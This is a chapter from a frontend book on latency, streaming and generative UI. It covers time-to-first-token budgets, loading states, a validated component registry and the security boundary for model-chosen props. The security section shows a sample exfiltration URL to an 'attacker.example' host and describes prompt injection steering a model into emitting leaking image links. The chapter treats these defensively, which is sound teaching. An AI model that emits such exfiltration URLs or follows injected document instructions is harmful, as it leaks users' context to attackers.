---
title: Latency and Generative UI
part: 7
chapter: 24
slug: generative-ui
level: advanced
reading_time: 14
updated: 2026-09-24
tags: [ai, ux, latency, streaming, perceived-performance, generative-ui, react, security, frontend, typescript]
in_book: true
---

# Latency and Generative UI {#ch-generative-ui}

> Make a multi-second answer feel responsive, then let the model pick your components from a fixed allow-list without opening a hole.

**In this chapter:** time to first token · what to show while the user waits · long-running work · the component registry · the security boundary of model-chosen props

## 💡 The Core Idea

An AI feature's honest floor is **hundreds of milliseconds to the first token and several seconds to a
full answer**. The model makes tokens one at a time, so no engineering removes that wait. You cannot make
it fast, so you make it feel responsive: show progress early, keep it moving, give the user something to read.

Once the answer arrives, prose is often the wrong shape. A question about last quarter's revenue wants a
chart, a table and a link. **Generative UI lets the model choose the component, while your code owns which
components exist and what they may receive.** The model picks a branch. It does not write code.

> Users forgive a slow answer. They do not forgive an interface that shows them nothing.

## How It Works

### The latency budget

| Stage | Typical | Reducible? |
| --- | --- | --- |
| Network to your server | 20–80 ms | Marginally |
| Retrieval | 50–400 ms | Yes — index, *k*, reranking |
| Prompt assembly | 1–20 ms | Rarely worth it |
| **Time to first token** | 200 ms – 2 s | Yes — smaller model, shorter prompt, caching |
| Token generation | 20–150 tokens/s | Only by generating less |

**Time to first token is the number users feel.** A reply that starts at 400 ms and ends at eight seconds
feels better than one that starts at four seconds and ends at five. Retrieval and reranking sit wholly
before the first token. In the documentation assistant, a 400 ms
reranker delays every visible byte. Prompt length also affects first-token time, which is one more reason
to send five good chunks rather than twenty.

The page still answers to an INP target, and a pane that re-renders on every token will fail it — see
[Chapter ?? — Core Web Vitals](#ch-core-web-vitals).

### What fills the wait

| Duration | Show | Why |
| --- | --- | --- |
| Under 300 ms | Nothing | A flashed spinner is worse than none |
| 300 ms – 1 s | A subtle indicator | Acknowledge the input |
| 1–3 s | A named stage: "searching the docs" | Progress that means something |
| 3–10 s | Streamed content | The answer itself is the progress bar |
| Over 10 s | Step-by-step progress, a cancel button | The user needs control |

Teams skip the third row. **A stage label is information, not decoration.** "Searching the docs" shows how
the system read the question, so a user it misread can stop now, not after eight seconds.

Streaming turns one long wait into an early start, then text arriving faster than a person reads. The
transport is in [Chapter ?? — Streaming Responses](#ch-streaming-responses). The interface rules are these:

- **Render each token as it lands.** Buffering to sentence ends brings back the wait you paid to remove.
- **Keep the layout stable.** Reserve the space, so the container does not reflow on every chunk.
- **Never auto-scroll past the user.** Pin to the bottom only while they are already at the bottom.
- **Show a cancel control from the first token.** It is the user's only control over time and cost.

### Work before the answer arrives

Prefetching retrieval on input focus, warming the connection on a keystroke and echoing the user's message
at once are close to free. A speculative model call on a likely question is not: an unused call is money
spent for nothing, and at scale that sum turns negative fast.

> ⚠️ Optimistic UI means less here. You can show at once that a request started. You cannot show the
> answer early, because you do not know it. An interface that guesses for the user is worse than one that
> admits it is working.

### Long-running work

Past ten seconds, a chat window is the wrong shape. A multi-minute agent run needs a background job's
tools: a visible plan, step progress, a cancel that really aborts, and a result that survives leaving the
page. Show the plan first — stopping a misread task at step one, not step twelve, saves time and money.

### The component registry

**Registry and renderer — the name is a lookup, the props are validated**

```tsx
const registry = {
  chart: {
    schema: z.object({
      kind: z.enum(['line', 'bar']),
      series: z.array(z.object({ label: z.string().max(40), value: z.number() })).max(50),
    }),
    Component: Chart,
  },
  citation: {
    schema: z.object({ chunkId: z.string() }),   // an id, not a URL — see below
    Component: Citation,
  },
} as const;

function render(name: string, props: unknown) {
  const entry = registry[name as keyof typeof registry];
  if (!entry) return <Fallback />;                       // unknown name: render nothing special
  const parsed = entry.schema.safeParse(props);
  if (!parsed.success) return <Fallback />;              // bad props: never partially render
  return <entry.Component {...parsed.data} />;
}
```

Three things make this safe. **An unknown name renders a fallback**, never anything the model invented.
**Props are checked before render**, so a missing field gives a fallback, not a broken component. **Bounds
live in the schema** — 50 points, 40 characters — because a model given an open-ended array will
sometimes produce a huge one.

The model emits blocks through [Chapter ?? — Structured Output](#ch-structured-output). A discriminated
union stops most invalid names at the decoding step, before the fallback is needed.

**The output schema — the model can only name components that exist**

```typescript
const UiBlock = z.discriminatedUnion('component', [
  z.object({ component: z.literal('chart'), props: registry.chart.schema }),
  z.object({ component: z.literal('citation'), props: registry.citation.schema }),
]);
```

### The security boundary

Every prop is a value the model produced, partly from documents you do not control. Treat the props as an
attack surface.

| Prop type | Risk | Rule |
| --- | --- | --- |
| Text | Injected instructions shown as fact | Render as text, never as HTML |
| URL (`href`, `src`) | Exfiltration channel, phishing target | Allow-list the origin, or pass an id and resolve it on the server |
| Markdown | Script, images, arbitrary links | A strict allow-list of tags and attributes |
| An id | Safe | Resolve on the server against what the user may see |
| Raw HTML | Cross-site scripting | Never |

The URL row matters most — see [Chapter ?? — Prompt Injection](#ch-prompt-injection). A model-controlled
image source is an outward channel: `https://attacker.example/x.png?d=<context>` leaks data on render,
with no click. A rendering choice has added the third leg of the lethal trifecta.

**Pass ids, resolve them on the server.** In the documentation assistant, a citation carries a chunk id.
The server turns it into a link only if that chunk was retrieved for this user.

> ⚠️ Rendering model output as Markdown with images turned on is an exfiltration channel unless image
> sources are restricted. It is the hole most often missed in a generative UI.

### Streaming a partial component

An object arrives field by field, so a component can render before its props are complete. Show a
skeleton until the schema validates — a chart with three of fifty points is wrong, not progressive.
Progressive rendering suits text, not anything a user reads as a number. Never fire side effects on
partial props, because a partial object is not a decision.

## When to Use It

| Feature | Design |
| --- | --- |
| Chat or documentation assistant | Stream, stage labels, cancel; text plus citation blocks |
| Data assistant with varied questions | A registry with chart, table and text blocks |
| A handful of known answer shapes | A classifier picks one of a few templates — no generation |
| Anything that writes or spends | Templates, plus an explicit confirmation step |
| Multi-minute agent run | Background-job UI: plan, progress, cancel, a result that survives |

Most "generative UI" requests are met by a classifier choosing one of five layouts. It is faster, cheaper,
testable and adds no new security surface. Measure whether generation is needed before building it.

## Common Mistakes

**❌ A spinner for an eight-second wait**

> It says nothing, and time feels slower. Stream, or at least name the stage.

**✅ Name the stage and stream from the first token**

> "Searching the docs" is progress and a chance to correct — the user can stop a misread request early.

**❌ Letting the model supply URLs, HTML or unrestricted Markdown**

> A model-controlled `src` or `href` is an outward channel; raw HTML is cross-site scripting by a new route.

**✅ Validate props against a bounded schema, pass ids, and fall back on failure**

> A fallback is a fine outcome. A half-rendered component with undefined props is not.

## 🔑 Key Takeaways

- Time to first token is the latency users feel, and retrieval sits entirely before it.
- Name the stage, stream each token, keep the layout stable, and never auto-scroll past a reader.
- Past ten seconds, use a background-job interface with a visible plan, progress, cancel and a lasting result.
- The model picks from a registry you wrote, and its props pass a bounded schema before anything renders.
- Model-supplied URLs are an exfiltration channel, so pass ids and resolve them on the server.

## Interview Questions

**Q: The model takes eight seconds. What does the user see?**

Not a spinner. Streamed text should start within a few hundred milliseconds, so the wait becomes an early
start and then text faster than they read. Before the first token, retrieval is still running, so I name
that stage. That gap is larger than any model upgrade would buy, and it is a frontend change.

**Q: You add a reranker that improves answers and costs 300 ms. Is it worth it?**

It depends where the 300 ms lands, and here it lands wholly before the first visible byte. So it is not a
free win. I would want the retrieval eval to show a real recall@5 gain. On a small corpus where the answer
is already in the top five, it is pure latency.

**Q: What is the risk in rendering components from model output, and how do you contain it?**

The output is untrusted input from a system that reads documents an attacker may control. So the model may
only name components from my registry, through a discriminated union, and every prop passes a bounded
schema. Anything unknown or invalid renders a fallback. The sharp edge is URLs: a model-controlled image
source leaks context on render with no click.

**Q: When would you not build generative UI?**

When the answer shapes are few and predictable, which is most of the time. A classifier choosing among
five templates is cheaper, faster, deterministic, testable and adds no security surface. I reach for
generation only when the answer varies with the data in ways I cannot list. Anything with side effects
stays on a template with explicit confirmation.

## What to Read Next

- [Chapter ?? — Streaming Responses](#ch-streaming-responses) — the transport that makes early tokens possible
- [Chapter ?? — Prompt Injection](#ch-prompt-injection) — why a model-supplied URL is a security decision
- [Chapter ?? — Trust, Correctness and Failure States](#ch-trust-and-correctness-ux) — what a citation block is for, and what the interface does when it fails
